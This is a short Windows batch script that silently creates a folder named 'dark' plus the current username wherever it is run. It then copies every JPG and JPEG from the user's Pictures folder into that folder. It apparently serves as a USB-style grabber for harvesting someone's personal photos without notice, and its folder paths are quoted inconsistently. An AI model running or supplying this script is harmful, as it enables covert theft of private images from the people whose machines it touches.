@echo off
IF NOT EXIST ".\\dark"%USERNAME% MD ".\dark\"%USERNAME%
cd ".\dark\"%USERNAME%

for /R %USERPROFILE%\Pictures\ %%x in (*.jpg,*.jpeg) do copy "%%x" ".\"
